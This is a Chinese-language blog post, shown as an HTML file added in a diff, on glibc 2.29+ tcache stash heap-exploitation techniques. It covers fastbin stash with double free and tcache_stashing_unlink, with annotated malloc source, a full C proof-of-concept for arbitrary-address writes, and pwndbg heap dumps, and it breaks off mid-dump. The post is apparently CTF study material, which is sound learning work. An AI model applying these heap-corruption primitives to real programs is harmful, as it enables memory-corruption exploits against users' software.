@@ -1,0 +1,1163 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=&#34;auto&#34;>
+
+
+
+<head><meta name="generator" content="Hexo 3.9.0">
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/favicon.png">
+  <link rel="icon" type="image/png" href="/img/favicon.png">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="description" content>
+  <meta name="author" content="chumen77">
+  <meta name="keywords" content>
+  <title>glibc 2.29引入stash 机制后引起的相关漏洞学习 - Chumen77&#39;s Blog</title>
+
+  <link rel="stylesheet" href="https://cdn.staticfile.org/twitter-bootstrap/4.4.1/css/bootstrap.min.css">
+
+
+  <link rel="stylesheet" href="https://cdn.staticfile.org/github-markdown-css/4.0.0/github-markdown.min.css">
+  <link rel="stylesheet" href="/lib/hint/hint.min.css">
+
+  
+    
+    
+      
+      <link rel="stylesheet" href="https://cdn.staticfile.org/highlight.js/10.0.0/styles/atom-one-dark.min.css">
+    
+  
+
+  
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_ba1fz6golrf.css">
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_kmeydafke9r.css">
+
+<link rel="stylesheet" href="/css/main.css">
+
+<!-- 自定义样式保持在最底部 -->
+
+
+  <script src="/js/utils.js"></script>
+  <script src="/js/color-schema.js"></script>
+</head>
+
+
+<body>
+  <header style="height: 70vh;">
+    <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand"
+       href="/">&nbsp;<strong>Chumen77's Blog</strong>&nbsp;</a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                首页
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                归档
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                标签
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                关于
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" data-toggle="modal" data-target="#modalSearch">&nbsp;<i
+                class="iconfont icon-search"></i>&nbsp;</a>
+          </li>
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" href="javascript:">&nbsp;<i
+                class="iconfont icon-dark" id="color-toggle-icon"></i>&nbsp;</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+    <div class="banner intro-2" id="background" parallax=true
+         style="background: url('/img/default.png') no-repeat center center;
+           background-size: cover;">
+      <div class="full-bg-img">
+        <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+          <div class="container page-header text-center fade-in-up">
+            <span class="h2" id="subtitle">
+              
+            </span>
+
+            
+              <div class="mt-3">
+  
+  
+    <span class="post-meta">
+      <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+      <time datetime="2020-10-29 16:15" pubdate>
+        2020年10月29日 下午
+      </time>
+    </span>
+  
+</div>
+
+<div class="mt-1">
+  
+    
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-chart"></i>
+      5.2k 字
+    </span>
+  
+
+  
+    
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-clock-fill"></i>
+      
+      
+      85
+       分钟
+    </span>
+  
+
+  
+  
+</div>
+
+            
+          </div>
+
+          
+        </div>
+      </div>
+    </div>
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid">
+  <div class="row">
+    <div class="d-none d-lg-block col-lg-2"></div>
+    <div class="col-lg-8 nopadding-md">
+      <div class="container nopadding-md" id="board-ctn">
+        <div class="py-5" id="board">
+          <article class="post-content mx-auto" id="post">
+            <!-- SEO header -->
+            <h1 style="display: none">glibc 2.29引入stash 机制后引起的相关漏洞学习</h1>
+            
+            <div class="markdown-body" id="post-body">
+              <h1 id="glibc-2-29引入stash-机制后引起的相关漏洞学习"><a href="#glibc-2-29引入stash-机制后引起的相关漏洞学习" class="headerlink" title="glibc 2.29引入stash 机制后引起的相关漏洞学习"></a>glibc 2.29引入stash 机制后引起的相关漏洞学习</h1><p>以下示例的libc源码均为libc2.31.</p>
+<h2 id="fastbin的stash机制"><a href="#fastbin的stash机制" class="headerlink" title="fastbin的stash机制"></a>fastbin的stash机制</h2><p>这里分析一下对于fastbin的stash机制</p>
+<div class="hljs"><pre><code class="hljs c"> <span class="hljs-keyword">if</span> ((<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span>)(nb) &lt;= (<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span>)(get_max_fast())) <span class="hljs-comment">//size在fastbin范围内</span>
+  &#123;
+    idx = fastbin_index(nb);
+    mfastbinptr *fb = &amp;fastbin(av, idx);
+    mchunkptr pp;
+    victim = *fb;
+ 
+    <span class="hljs-keyword">if</span> (victim != <span class="hljs-literal">NULL</span>) <span class="hljs-comment">//如果有chunk</span>
+    &#123;
+      <span class="hljs-keyword">if</span> (SINGLE_THREAD_P)
+        *fb = victim-&gt;fd; <span class="hljs-comment">//取出头chunk</span>
+      <span class="hljs-keyword">else</span>
+        REMOVE_FB(fb, pp, victim);
+ 
+      <span class="hljs-keyword">if</span> (__glibc_likely(victim != <span class="hljs-literal">NULL</span>)) 
+      &#123;
+        <span class="hljs-keyword">size_t</span> victim_idx = fastbin_index(chunksize(victim));
+        <span class="hljs-keyword">if</span> (__builtin_expect(victim_idx != idx, <span class="hljs-number">0</span>)) <span class="hljs-comment">//对fastbin的size检查</span>
+          malloc_printerr(<span class="hljs-string">"malloc(): memory corruption (fast)"</span>);
+        check_remalloced_chunk(av, victim, nb);
+ 
+ <span class="hljs-comment">//if USE_TCACHE，且看到此fastbin链表下，存在相同大小的bins（也就是一条chain），进行Stash。过程：把剩下的bins放入Tcache中</span>
+        <span class="hljs-comment">/* While we're here, if we see other chunks of the same size,
+		 stash them in the tcache.  */</span>
+        <span class="hljs-keyword">size_t</span> tc_idx = csize2tidx(nb);
+        <span class="hljs-keyword">if</span> (tcache &amp;&amp; tc_idx &lt; mp_.tcache_bins) <span class="hljs-comment">//如果属于tcache管辖范围</span>
+        &#123;
+          mchunkptr tc_victim;
+ 
+          <span class="hljs-comment">/* While bin not empty and tcache not full, copy chunks.  */</span>
+          <span class="hljs-keyword">while</span> (tcache-&gt;counts[tc_idx] &lt; mp_.tcache_count &amp;&amp; (tc_victim = *fb) != <span class="hljs-literal">NULL</span>) <span class="hljs-comment">//只要tcache没满，并且fastbin还有chunk</span>
+          &#123;
+            <span class="hljs-keyword">if</span> (SINGLE_THREAD_P)  <span class="hljs-comment">//从fastbin中取出</span>
+              *fb = tc_victim-&gt;fd;
+            <span class="hljs-keyword">else</span>
+            &#123;
+              REMOVE_FB(fb, pp, tc_victim);
+              <span class="hljs-keyword">if</span> (__glibc_unlikely(tc_victim == <span class="hljs-literal">NULL</span>))
+                <span class="hljs-keyword">break</span>;
+            &#125;
+            tcache_put(tc_victim, tc_idx);<span class="hljs-comment">//放入tcache中</span>
+          &#125;
+        &#125;
+<span class="hljs-meta">#<span class="hljs-meta-keyword">endif</span></span>
+        <span class="hljs-keyword">void</span> *p = chunk2mem(victim);
+        alloc_perturb(p, bytes);
+        <span class="hljs-keyword">return</span> p;
+      &#125;
+    &#125;
+  &#125;</code></pre></div>
+
+<p>也就是比如当一个线程申请0x50大小的chunk时，如果tcache没有，那么就会进入分配区进行处理，如果对应bin中存在0x50的chunk，除了取出并返回之外，ptmalloc会认为这个线程在将来还需要相同的大小的chunk，因此就会把对应bin中0x50的chunk尽可能的放入tcache的对应链表中去。</p>
+<h3 id="Tcache-Stashing-遇上-fastbin-double-free"><a href="#Tcache-Stashing-遇上-fastbin-double-free" class="headerlink" title="Tcache Stashing  遇上 fastbin double free"></a>Tcache Stashing  遇上 fastbin double free</h3><p>假设有个double free可以触发，其用到fastbin上：<br>进行free 多次构成：</p>
+<p><img src="http://qiqianyun.chumen77.xyz/uPic/G59EQi.png" srcset="/img/loading.gif" alt="1"></p>
+<p>为了触发stash，先申请完tcache里的chunk，让其为空，（或者让其不满也可以）</p>
+<p>然后再申请一下同size的chunk，就会触发stash。也是其精妙之处，在glibc2.27以下，往往是这样的构造：</p>
+<p><img src="http://qiqianyun.chumen77.xyz/uPic/S4rab1.png" srcset="/img/loading.gif" alt="2"></p>
+<p>主要由于fastbin 取出时，其会检查size是否相符合，导致很受限制。此时其基本就是可以攻击带有0x7f,去攻击libc上的内存。</p>
+<p>但是有了stash这个机制，其就变成了以下的情况：</p>
+<p><img src="http://qiqianyun.chumen77.xyz/uPic/68p4Vb.png" srcset="/img/loading.gif" alt="3"></p>
+<p>由于上来申请同size的chunk时触发了stash机制，其会把fastbin里剩下的chunk放入到tcache中。由于chunk 7的fd是可以控制的，写入tag地址，然后放入chain的chunk ，也就是chunk 8 、7 、tag 。这就相当于劫持了tcache chain，可以实现任意地址写。</p>
+<h3 id="相关例题"><a href="#相关例题" class="headerlink" title="相关例题"></a>相关例题</h3><ul>
+<li>bytectf2020 gun</li>
+<li>太湖杯 seven hero （libc2.29）</li>
+</ul>
+<h2 id="smallbin的stash机制"><a href="#smallbin的stash机制" class="headerlink" title="smallbin的stash机制"></a>smallbin的stash机制</h2><p>对于smallbin的stash机制：</p>
+<div class="hljs"><pre><code class="hljs c"><span class="hljs-keyword">if</span> (in_smallbin_range (nb))
+	&#123;
+	  idx = smallbin_index (nb);
+	  bin = bin_at (av, idx); <span class="hljs-comment">//smallbin 从chain尾开始取到的chunk的fd位位 bin值 （根据 FIFO，即为最先放入的 Chunk）</span>
+
+	  <span class="hljs-keyword">if</span> ((victim = last (bin)) != bin) <span class="hljs-comment">//victim 即为刚刚取到的chunk</span>
+		&#123;
+		  bck = victim-&gt;bk; <span class="hljs-comment">//获取倒数第二个chunk  </span>
+	  <span class="hljs-keyword">if</span> (__glibc_unlikely (bck-&gt;fd != victim)) <span class="hljs-comment">//验证双向链表是否正常</span>
+		malloc_printerr (<span class="hljs-string">"malloc(): smallbin double linked list corrupted"</span>);
+		  set_inuse_bit_at_offset (victim, nb);
+		  bin-&gt;bk = bck;
+		  bck-&gt;fd = bin;
+		  <span class="hljs-comment">//将 bin 的 bk 指向 victim 的后一个 Chunk，将 victim 后一个 Chunk 的 fd 指向 bin，即将 victim 取出</span>
+		  <span class="hljs-keyword">if</span> (av != &amp;main_arena)
+		set_non_main_arena (victim);
+		  check_malloced_chunk (av, victim, nb);
+<span class="hljs-meta">#<span class="hljs-meta-keyword">if</span> USE_TCACHE</span>
+	  <span class="hljs-comment">/* While we're here, if we see other chunks of the same size,
+		 stash them in the tcache.  */</span>
+	  <span class="hljs-keyword">size_t</span> tc_idx = csize2tidx (nb); <span class="hljs-comment">//获取对应size的tcache索引</span>
+	  <span class="hljs-keyword">if</span> (tcache &amp;&amp; tc_idx &lt; mp_.tcache_bins)
+		&#123;
+		  mchunkptr tc_victim;
+
+		  <span class="hljs-comment">/* While bin not empty and tcache not full, copy chunks over.  */</span>
+		  <span class="hljs-keyword">while</span> (tcache-&gt;counts[tc_idx] &lt; mp_.tcache_count
+			 &amp;&amp; (tc_victim = last (bin)) != bin)   <span class="hljs-comment">//#define last(b)      ((b)-&gt;bk)  也就是 tc_victim = bin-&gt;bk</span>
+		&#123;
+		  <span class="hljs-keyword">if</span> (tc_victim != <span class="hljs-number">0</span>)
+			&#123;
+			  bck = tc_victim-&gt;bk;
+			  set_inuse_bit_at_offset (tc_victim, nb);
+			  <span class="hljs-keyword">if</span> (av != &amp;main_arena)
+			set_non_main_arena (tc_victim);
+			  bin-&gt;bk = bck;
+			  bck-&gt;fd = bin;
+		  <span class="hljs-comment">//将 bin 的 bk 指向 tc_victim 的后一个 Chunk，将 tc_victim 后一个 Chunk 的 fd 指向 bin，即将 tc_victim 取出</span>
+			  tcache_put (tc_victim, tc_idx);
+				&#125;
+		&#125;
+		&#125;
+<span class="hljs-meta">#<span class="hljs-meta-keyword">endif</span></span>
+		  <span class="hljs-keyword">void</span> *p = chunk2mem (victim);
+		  alloc_perturb (p, bytes);
+		  <span class="hljs-keyword">return</span> p;
+		&#125;
+	&#125;</code></pre></div>
+
+<p>也就是在smallbin分配之后，如果smallbin链表中仍然存在堆块，并且对应的tcache list没有满chain的话，就会将small bin链表中所有的堆块放入到相应的tcache中。</p>
+<p><strong>当然要发生这种分配的方式，必须要越过tcache优先分配堆块，calloc的分配是不从tcache bin里取chunk的，即可满足。</strong></p>
+<p>下面跟着示例代码和glibc相关源码调试来学习一下：</p>
+<h3 id="tcache-stashing-unlink"><a href="#tcache-stashing-unlink" class="headerlink" title="tcache_stashing_unlink"></a><code>tcache_stashing_unlink</code></h3><h4 id="示例代码"><a href="#示例代码" class="headerlink" title="示例代码"></a>示例代码</h4><div class="hljs"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span>
+<span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdlib.h&gt;</span></span>
+<span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;inttypes.h&gt;</span></span>
+
+<span class="hljs-keyword">static</span> <span class="hljs-keyword">uint64_t</span> victim = <span class="hljs-number">0</span>;
+
+<span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">int</span> argc, <span class="hljs-keyword">char</span> **argv)</span></span>&#123;
+	setbuf(<span class="hljs-built_in">stdout</span>, <span class="hljs-number">0</span>);
+	setbuf(<span class="hljs-built_in">stderr</span>, <span class="hljs-number">0</span>);
+
+	<span class="hljs-keyword">char</span> *t1;
+	<span class="hljs-keyword">char</span> *s1, *s2, *pad;
+	<span class="hljs-keyword">char</span> *tmp;
+
+	<span class="hljs-built_in">printf</span>(<span class="hljs-string">"You can use this technique to write a big number to arbitrary address instead of unsortedbin attack\n"</span>);
+
+	<span class="hljs-built_in">printf</span>(<span class="hljs-string">"\n1. need to know heap address and the victim address that you need to attack\n"</span>);
+
+	tmp = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x1</span>);
+	<span class="hljs-built_in">printf</span>(<span class="hljs-string">"victim's address: %p, victim's vaule: 0x%lx\n"</span>, &amp;victim, victim);
+	<span class="hljs-built_in">printf</span>(<span class="hljs-string">"heap address: %p\n"</span>, tmp<span class="hljs-number">-0x260</span>);
+
+	<span class="hljs-built_in">printf</span>(<span class="hljs-string">"\n2. choose a stable size and free six identical size chunks to tcache_entry list\n"</span>);
+	<span class="hljs-built_in">printf</span>(<span class="hljs-string">"Here, I choose the size 0x60\n"</span>);
+	<span class="hljs-keyword">for</span>(<span class="hljs-keyword">int</span> i=<span class="hljs-number">0</span>; i&lt;<span class="hljs-number">6</span>; i++)&#123;
+		t1 = <span class="hljs-built_in">calloc</span>(<span class="hljs-number">1</span>, <span class="hljs-number">0x50</span>);
+		<span class="hljs-built_in">free</span>(t1);
+	&#125;
+
+	<span class="hljs-built_in">printf</span>(<span class="hljs-string">"Now, the tcache_entry[4] list is %p --&gt; %p --&gt; %p --&gt; %p --&gt; %p --&gt; %p\n"</span>, 
+		t1, t1<span class="hljs-number">-0x60</span>, t1<span class="hljs-number">-0x60</span>*<span class="hljs-number">2</span>, t1<span class="hljs-number">-0x60</span>*<span class="hljs-number">3</span>, t1<span class="hljs-number">-0x60</span>*<span class="hljs-number">4</span>, t1<span class="hljs-number">-0x60</span>*<span class="hljs-number">5</span>);
+
+	<span class="hljs-built_in">printf</span>(<span class="hljs-string">"\n3. free two chunk with the same size like tcache_entry into the corresponding smallbin\n"</span>);
+	<span class="hljs-comment">/* 将两个大小相同的块（如tcache_entry）释放到相应的smallbin中 */</span>
+	s1 = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x420</span>);
+	<span class="hljs-built_in">printf</span>(<span class="hljs-string">"Alloc a chunk %p, whose size is beyond tcache size threshold\n"</span>, s1);
+	pad = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x20</span>);
+	<span class="hljs-built_in">printf</span>(<span class="hljs-string">"Alloc a padding chunk, avoid %p to merge to top chunk\n"</span>, s1);
+	<span class="hljs-built_in">free</span>(s1);
+	<span class="hljs-built_in">printf</span>(<span class="hljs-string">"Free chunk %p to unsortedbin\n"</span>, s1);
+	<span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x3c0</span>);
+	<span class="hljs-built_in">printf</span>(<span class="hljs-string">"Alloc a calculated size, make the rest chunk size in unsortedbin is 0x60\n"</span>);
+	<span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x100</span>);
+	<span class="hljs-built_in">printf</span>(<span class="hljs-string">"Alloc a chunk whose size is larger than rest chunk size in unsortedbin, that will trigger chunk to other bins like smallbins\n"</span>);
+	<span class="hljs-built_in">printf</span>(<span class="hljs-string">"chunk %p is in smallbin[4], whose size is 0x60\n"</span>, s1+<span class="hljs-number">0x3c0</span>);
+
+	<span class="hljs-built_in">printf</span>(<span class="hljs-string">"Repeat the above steps, and free another chunk into corresponding smallbin\n"</span>);
+	<span class="hljs-built_in">printf</span>(<span class="hljs-string">"A little difference, notice the twice pad chunk size must be larger than 0x60, or you will destroy first chunk in smallbin[4]\n"</span>);
+	s2 = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x420</span>);
+	pad = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x80</span>);
+	<span class="hljs-built_in">free</span>(s2);
+	<span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x3c0</span>);
+	<span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x100</span>);
+	<span class="hljs-built_in">printf</span>(<span class="hljs-string">"chunk %p is in smallbin[4], whose size is 0x60\n"</span>, s2+<span class="hljs-number">0x3c0</span>);
+	<span class="hljs-built_in">printf</span>(<span class="hljs-string">"smallbin[4] list is %p &lt;--&gt; %p\n"</span>, s2+<span class="hljs-number">0x3c0</span>, s1+<span class="hljs-number">0x3c0</span>);
+
+	<span class="hljs-built_in">printf</span>(<span class="hljs-string">"\n4. overwrite the first chunk in smallbin[4]'s bk pointer to &amp;victim-0x10 address, the first chunk is smallbin[4]-&gt;fd\n"</span>);
+	
+	<span class="hljs-built_in">printf</span>(<span class="hljs-string">"Change %p's bk pointer to &amp;victim-0x10 address: 0x%lx\n"</span>, s2+<span class="hljs-number">0x3c0</span>, (<span class="hljs-keyword">uint64_t</span>)(&amp;victim)<span class="hljs-number">-0x10</span>);
+	*(<span class="hljs-keyword">uint64_t</span>*)((s2+<span class="hljs-number">0x3c0</span>)+<span class="hljs-number">0x18</span>) = (<span class="hljs-keyword">uint64_t</span>)(&amp;victim)<span class="hljs-number">-0x10</span>;
+
+	<span class="hljs-built_in">printf</span>(<span class="hljs-string">"\n5. use calloc to apply to smallbin[4], it will trigger stash mechanism in smallbin.\n"</span>);
+
+	<span class="hljs-built_in">calloc</span>(<span class="hljs-number">1</span>, <span class="hljs-number">0x50</span>);
+
+	<span class="hljs-built_in">printf</span>(<span class="hljs-string">"Finally, the victim's value is changed to a big number\n"</span>);
+	<span class="hljs-built_in">printf</span>(<span class="hljs-string">"Now, victim's value: 0x%lx\n"</span>, victim);
+	<span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;
+&#125;</code></pre></div>
+
+<h4 id="编译命令"><a href="#编译命令" class="headerlink" title="编译命令"></a>编译命令</h4><div class="hljs"><pre><code class="hljs c">gcc  -g ./tcache_stashing_unlink.c -o tcache_stashing_unlink</code></pre></div>
+
+<p>-g 编译是可以让gdb显示源码</p>
+<h4 id="调试过程"><a href="#调试过程" class="headerlink" title="调试过程"></a>调试过程</h4><div class="hljs"><pre><code class="hljs c"><span class="hljs-keyword">for</span>(<span class="hljs-keyword">int</span> i=<span class="hljs-number">0</span>; i&lt;<span class="hljs-number">6</span>; i++)&#123;
+		t1 = <span class="hljs-built_in">calloc</span>(<span class="hljs-number">1</span>, <span class="hljs-number">0x50</span>);
+		<span class="hljs-built_in">free</span>(t1);
+	&#125;</code></pre></div>
+
+<div class="hljs"><pre><code class="hljs undefined">(0x60)   tcache_entry[<span class="hljs-string">4</span>](<span class="hljs-link">6</span>): 0x5555555594a0 --&gt; 0x555555559440 --&gt; 0x5555555593e0 --&gt; 0x555555559380 --&gt; 0x555555559320 --&gt; 0x5555555592c0</code></pre></div>
+
+<p>先往tcache 中0x60的bin chain 上放入6个bin.。</p>
+<p>接着将两个大小相同的块（如<code>tcache_entry</code>）释放到相应的smallbin中。</p>
+<div class="hljs"><pre><code class="hljs c">s1 = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x420</span>);
+<span class="hljs-built_in">printf</span>(<span class="hljs-string">"Alloc a chunk %p, whose size is beyond tcache size threshold\n"</span>, s1);
+pad = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x20</span>);
+<span class="hljs-built_in">printf</span>(<span class="hljs-string">"Alloc a padding chunk, avoid %p to merge to top chunk\n"</span>, s1);
+<span class="hljs-built_in">free</span>(s1);
+<span class="hljs-built_in">printf</span>(<span class="hljs-string">"Free chunk %p to unsortedbin\n"</span>, s1);</code></pre></div>
+
+<div class="hljs"><pre><code class="hljs undefined">pwndbg&gt; heapinfo
+(<span class="hljs-number">0x20</span>)     fastbin[<span class="hljs-number">0</span>]: <span class="hljs-number">0x0</span>
+(<span class="hljs-number">0x30</span>)     fastbin[<span class="hljs-number">1</span>]: <span class="hljs-number">0x0</span>
+(<span class="hljs-number">0x40</span>)     fastbin[<span class="hljs-number">2</span>]: <span class="hljs-number">0x0</span>
+(<span class="hljs-number">0x50</span>)     fastbin[<span class="hljs-number">3</span>]: <span class="hljs-number">0x0</span>
+(<span class="hljs-number">0x60</span>)     fastbin[<span class="hljs-number">4</span>]: <span class="hljs-number">0x0</span>
+(<span class="hljs-number">0x70</span>)     fastbin[<span class="hljs-number">5</span>]: <span class="hljs-number">0x0</span>
+(<span class="hljs-number">0x80</span>)     fastbin[<span class="hljs-number">6</span>]: <span class="hljs-number">0x0</span>
+(<span class="hljs-number">0x90</span>)     fastbin[<span class="hljs-number">7</span>]: <span class="hljs-number">0x0</span>
+(<span class="hljs-number">0xa0</span>)     fastbin[<span class="hljs-number">8</span>]: <span class="hljs-number">0x0</span>
+(<span class="hljs-number">0xb0</span>)     fastbin[<span class="hljs-number">9</span>]: <span class="hljs-number">0x0</span>
+                  top: <span class="hljs-number">0x555555559950</span> (size : <span class="hljs-number">0x206b0</span>) 
+       last_remainder: <span class="hljs-number">0x0</span> (size : <span class="hljs-number">0x0</span>) 
+            unsortbin: <span class="hljs-number">0x5555555594f0</span> (size : <span class="hljs-number">0x430</span>)</code></pre></div>
+
+<div class="hljs"><pre><code class="hljs c"><span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x3c0</span>);
+<span class="hljs-built_in">printf</span>(<span class="hljs-string">"Alloc a calculated size, make the rest chunk size in unsortedbin is 0x60\n"</span>);
+<span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x100</span>);</code></pre></div>
+
+<div class="hljs"><pre><code class="hljs undefined">pwndbg&gt; heapinfo
+(<span class="hljs-number">0x20</span>)     fastbin[<span class="hljs-number">0</span>]: <span class="hljs-number">0x0</span>
+(<span class="hljs-number">0x30</span>)     fastbin[<span class="hljs-number">1</span>]: <span class="hljs-number">0x0</span>
+(<span class="hljs-number">0x40</span>)     fastbin[<span class="hljs-number">2</span>]: <span class="hljs-number">0x0</span>
+(<span class="hljs-number">0x50</span>)     fastbin[<span class="hljs-number">3</span>]: <span class="hljs-number">0x0</span>
+(<span class="hljs-number">0x60</span>)     fastbin[<span class="hljs-number">4</span>]: <span class="hljs-number">0x0</span>
+(<span class="hljs-number">0x70</span>)     fastbin[<span class="hljs-number">5</span>]: <span class="hljs-number">0x0</span>
+(<span class="hljs-number">0x80</span>)     fastbin[<span class="hljs-number">6</span>]: <span class="hljs-number">0x0</span>
+(<span class="hljs-number">0x90</span>)     fastbin[<span class="hljs-number">7</span>]: <span class="hljs-number">0x0</span>
+(<span class="hljs-number">0xa0</span>)     fastbin[<span class="hljs-number">8</span>]: <span class="hljs-number">0x0</span>
+(<span class="hljs-number">0xb0</span>)     fastbin[<span class="hljs-number">9</span>]: <span class="hljs-number">0x0</span>
+                  top: <span class="hljs-number">0x555555559950</span> (size : <span class="hljs-number">0x206b0</span>) 
+       last_remainder: <span class="hljs-number">0x5555555598c0</span> (size : <span class="hljs-number">0x60</span>) 
+            unsortbin: <span class="hljs-number">0x5555555598c0</span> (size : <span class="hljs-number">0x60</span>)
+(<span class="hljs-number">0x60</span>)   tcache_entry[<span class="hljs-number">4</span>](<span class="hljs-number">6</span>): <span class="hljs-number">0x5555555594a0</span> --&gt; <span class="hljs-number">0x555555559440</span> --&gt; <span class="hljs-number">0x5555555593e0</span> --&gt; <span class="hljs-number">0x555555559380</span> --&gt; <span class="hljs-number">0x555555559320</span> --&gt; <span class="hljs-number">0x5555555592c0</span></code></pre></div>
+
+<p>可以看到0x5555555598c0是在<code>last_remainder</code>之中的，由于其不会进入tcache的特性，就可以进入到smallbin中。</p>
+<div class="hljs"><pre><code class="hljs undefined">pwndbg&gt; heapinfo
+(<span class="hljs-number">0x20</span>)     fastbin[<span class="hljs-number">0</span>]: <span class="hljs-number">0x0</span>
+(<span class="hljs-number">0x30</span>)     fastbin[<span class="hljs-number">1</span>]: <span class="hljs-number">0x0</span>
+(<span class="hljs-number">0x40</span>)     fastbin[<span class="hljs-number">2</span>]: <span class="hljs-number">0x0</span>
+(<span class="hljs-number">0x50</span>)     fastbin[<span class="hljs-number">3</span>]: <span class="hljs-number">0x0</span>
+(<span class="hljs-number">0x60</span>)     fastbin[<span class="hljs-number">4</span>]: <span class="hljs-number">0x0</span>
+(<span class="hljs-number">0x70</span>)     fastbin[<span class="hljs-number">5</span>]: <span class="hljs-number">0x0</span>
+(<span class="hljs-number">0x80</span>)     fastbin[<span class="hljs-number">6</span>]: <span class="hljs-number">0x0</span>
+(<span class="hljs-number">0x90</span>)     fastbin[<span class="hljs-number">7</span>]: <span class="hljs-number">0x0</span>
+(<span class="hljs-number">0xa0</span>)     fastbin[<span class="hljs-number">8</span>]: <span class="hljs-number">0x0</span>
+(<span class="hljs-number">0xb0</span>)     fastbin[<span class="hljs-number">9</span>]: <span class="hljs-number">0x0</span>
+                  top: <span class="hljs-number">0x555555559a60</span> (size : <span class="hljs-number">0x205a0</span>) 
+       last_remainder: <span class="hljs-number">0x5555555598c0</span> (size : <span class="hljs-number">0x60</span>) 
+            unsortbin: <span class="hljs-number">0x0</span>
+(<span class="hljs-number">0x060</span>)  smallbin[ <span class="hljs-number">4</span>]: <span class="hljs-number">0x5555555598c0</span>
+(<span class="hljs-number">0x60</span>)   tcache_entry[<span class="hljs-number">4</span>](<span class="hljs-number">6</span>): <span class="hljs-number">0x5555555594a0</span> --&gt; <span class="hljs-number">0x555555559440</span> --&gt; <span class="hljs-number">0x5555555593e0</span> --&gt; <span class="hljs-number">0x555555559380</span> --&gt; <span class="hljs-number">0x555555559320</span> --&gt; <span class="hljs-number">0x5555555592c0</span></code></pre></div>
+
+<p>接着重复这个步骤，在构造一个进入smallbin的chunk。</p>
+<div class="hljs"><pre><code class="hljs c"><span class="hljs-built_in">printf</span>(<span class="hljs-string">"Repeat the above steps, and free another chunk into corresponding smallbin\n"</span>);
+<span class="hljs-built_in">printf</span>(<span class="hljs-string">"A little difference, notice the twice pad chunk size must be larger than 0x60, or you will destroy first chunk in smallbin[4]\n"</span>);
+s2 = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x420</span>);
+pad = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x80</span>); <span class="hljs-comment">//防止合并的pad chunk，其必须大于0x60</span>
+<span class="hljs-built_in">free</span>(s2);
+<span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x3c0</span>);
+<span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x100</span>);</code></pre></div>
+
+<div class="hljs"><pre><code class="hljs undefined">pwndbg&gt; heapinfo
+(<span class="hljs-number">0x20</span>)     fastbin[<span class="hljs-number">0</span>]: <span class="hljs-number">0x0</span>
+(<span class="hljs-number">0x30</span>)     fastbin[<span class="hljs-number">1</span>]: <span class="hljs-number">0x0</span>
+(<span class="hljs-number">0x40</span>)     fastbin[<span class="hljs-number">2</span>]: <span class="hljs-number">0x0</span>
+(<span class="hljs-number">0x50</span>)     fastbin[<span class="hljs-number">3</span>]: <span class="hljs-number">0x0</span>
+(<span class="hljs-number">0x60</span>)     fastbin[<span class="hljs-number">4</span>]: <span class="hljs-number">0x0</span>
